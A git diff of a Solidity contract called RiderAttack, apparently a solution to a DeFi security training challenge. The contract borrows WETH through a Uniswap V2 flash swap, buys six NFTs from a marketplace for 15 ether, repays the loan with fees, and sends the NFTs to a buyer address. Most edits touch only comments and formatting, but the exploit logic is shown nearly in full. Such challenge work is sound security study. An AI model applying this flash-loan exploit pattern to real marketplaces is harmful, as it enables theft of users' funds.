@@ -39,47 +39,45 @@ contract RiderAttack is IERC721Receiver{
         weth = _weth;
         marketplace = _marketplace;
         buyer = _buyer;
-    }
+    } 
 
-    //attack
     function attack(uint256 _amount) external {
-        uniPair.swap(_amount, 0, address(this), "give my a flashswap");  
+        uniPair.swap(_amount, 0, address(this), "give me some money");
     }
 
-    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
+    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external{
         address token0 = IUniswapV2Pair(msg.sender).token0(); // fetch the address of token0
         address token1 = IUniswapV2Pair(msg.sender).token1(); // fetch the address of token1
         assert(msg.sender == factory.getPair(token0, token1)); // ensure that msg.sender is a V2 pair
         // rest of the function goes here!
 
-        //unwrap the weth 
+        //unwrap weth into eth 
         weth.withdraw(amount0);
 
-        //create an array
+        //create an array for the tokenIds
         uint256[] memory NFTs = new uint256[](6);
-
-        for (uint256 i = 0; i < 6; i++){
+        for (uint256 i; i < 6; ++i){
             NFTs[i] = i;
         }
 
-        //buy many with the tokenIDs
+        //buy many NFTs
         marketplace.buyMany{value: 15 ether}(NFTs);
 
-        //calculate the fees on the flashswap
+        //calculate the fees to repay
         uint256 fees = (amount0 * 100301) / 100000; 
 
-        //rewrap our eth into weth
-        weth.deposit{value: fees}();
+        //rewrap the eth into weth
+        weth.deposit{value: fees}(); 
 
-        //repay the flashswap
+        //repay the flashswap plus fees
         weth.transfer(msg.sender, fees);
 
-        //transfer tokens to the buyer
-        for (uint256 i = 0; i < 6; i ++){
+        //transfer tokens to buyer
+        for (uint256 i; i < 6; ++i){
             dvNFT.safeTransferFrom(address(this), buyer, NFTs[i]);
         }
 
-        }
+    }
 
         function onERC721Received(
         address,
@@ -90,9 +88,9 @@ contract RiderAttack is IERC721Receiver{
         external
         override
         returns (bytes4) 
-    {
+    {   
         return IERC721Receiver.onERC721Received.selector;
     }
 
-        receive() external payable{}
+    receive() external payable{}
 }
